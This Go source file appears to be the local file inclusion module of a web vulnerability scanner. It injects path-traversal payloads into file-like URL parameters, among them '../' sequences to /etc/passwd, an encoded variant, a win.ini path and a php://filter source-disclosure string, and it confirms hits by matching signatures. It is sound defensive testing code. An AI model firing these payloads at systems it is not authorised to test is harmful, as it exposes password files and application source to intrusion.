// Package lfi tests local file inclusion and path traversal: it injects
// traversal and PHP stream-wrapper payloads into parameters that look like file
// paths and confirms a hit when local file contents come back.
package lfi

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
	"github.com/sayseven7/frameseven/internal/verify"
)

// probe is an injection payload paired with a regex that confirms a hit.
type probe struct {
	label     string
	payload   string
	signature *regexp.Regexp
}

var probes = []probe{
	{"Linux /etc/passwd", "../../../../../../etc/passwd", regexp.MustCompile(`root:.*:0:0:`)},
	{"Linux /etc/passwd (encoded)", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", regexp.MustCompile(`root:.*:0:0:`)},
	{"Windows win.ini", "..\\..\\..\\..\\..\\windows\\win.ini", regexp.MustCompile(`(?i)\[fonts\]|\[extensions\]`)},
	{"PHP filter source disclosure", "php://filter/convert.base64-encode/resource=index.php", regexp.MustCompile(`[A-Za-z0-9+/]{120,}={0,2}`)},
}

var paramHint = regexp.MustCompile(`(?i)file|path|page|doc|document|template|include|require|load|read|view|download|dir|folder|name|content|resource`)
var customSignature = regexp.MustCompile(`(?i)root:.*:0:0:|\[fonts\]|\[extensions\]|[A-Za-z0-9+/]{120,}={0,2}`)

// lfiMarker matches content that proves a local file was actually read: the
// /etc/passwd record, win.ini / boot.ini sections, or the long base64 blob a
// PHP filter source disclosure returns.
var lfiMarker = regexp.MustCompile(`(?i)root:.*:0:0:|\[fonts\]|\[extensions\]|\[boot loader\]|[A-Za-z0-9+/]{120,}={0,2}`)

type response struct {
	body        string
	dump        string
	status      int
	contentType string
}

// Run injects LFI/path-traversal payloads into candidate parameters.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}
	matchedAny := false

	for _, p := range surface.Params {
		if !paramHint.MatchString(p.Name) {
			continue
		}

		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true
		matchedAny = true

		findings = append(findings, testParam(cfg, client, p, surface)...)
	}

	if !matchedAny {
		findings = append(findings, finding.Finding{
			Title:       "No file-like parameters discovered for LFI testing",
			Module:      "lfi",
			Severity:    finding.Info,
			OWASP:       "A01:2025 - Broken Access Control",
			Description: "None of the discovered parameters matched the file/path hint pattern. LFI probes were skipped.",
			NextSteps:   []string{"Manually inspect the application for parameters that accept file paths or document names."},
		})
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding

	// A benign control value establishes what the parameter returns without a
	// traversal payload, so the injection can be required to produce a delta.
	control := inject(cfg, client, p, "frameseven-control")

	for _, pr := range allProbes(cfg) {
		resp := inject(cfg, client, p, pr.payload)
		if resp == nil || !pr.signature.MatchString(resp.body) {
			continue
		}

		// Reject when the traversal response is the host's catch-all page.
		if verify.MatchesBaseline(surface.Baseline, resp.status, resp.contentType, []byte(resp.body)) {
			continue
		}

		// Reject when the traversal payload does not change the response versus
		// the benign control: same body for any value is not a file read.
		if control != nil {
			diff := verify.CompareResponses(control.status, []byte(control.body), resp.status, []byte(resp.body))
			if !diff.HasDelta {
				continue
			}
		}

		// Require a marker that proves a local file was actually read.
		if !lfiMarker.Match([]byte(resp.body)) {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "Local file inclusion / path traversal via parameter '" + p.Name + "' (" + pr.label + ")",
			Module:      "lfi",
			Severity:    finding.High,
			OWASP:       "A01:2025 - Broken Access Control",
			CWE:         "CWE-22",
			CVSS:        8.6,
			Description: "A traversal payload returned local file contents, confirming arbitrary file read.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Response:  trim(resp.body, 500),
				Extracted: pr.label + " via " + pr.payload,
			},
			NextSteps: []string{
				"Resolve and validate paths against an allowlisted base directory.",
				"Reject traversal sequences and disable dangerous stream wrappers (php://, file://).",
			},
			Confidence: 0.9,
		})
	}

	return findings
}

func allProbes(cfg *config.Config) []probe {
	selected := append([]probe{}, probes...)
	seen := map[string]bool{}

	for _, pr := range probes {
		seen[pr.payload] = true
	}

	for _, payload := range cfg.NormalizedCustomPayloads() {
		if seen[payload] {
			continue
		}

		seen[payload] = true
		selected = append(selected, probe{
			label:     "Custom LFI payload",
			payload:   payload,
			signature: customSignature,
		})
	}

	return selected
}

func inject(cfg *config.Config, client *http.Client, p recon.Param, payload string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, payload)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{
		body:        string(body),
		dump:        string(dump),
		status:      resp.StatusCode,
		contentType: resp.Header.Get("Content-Type"),
	}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
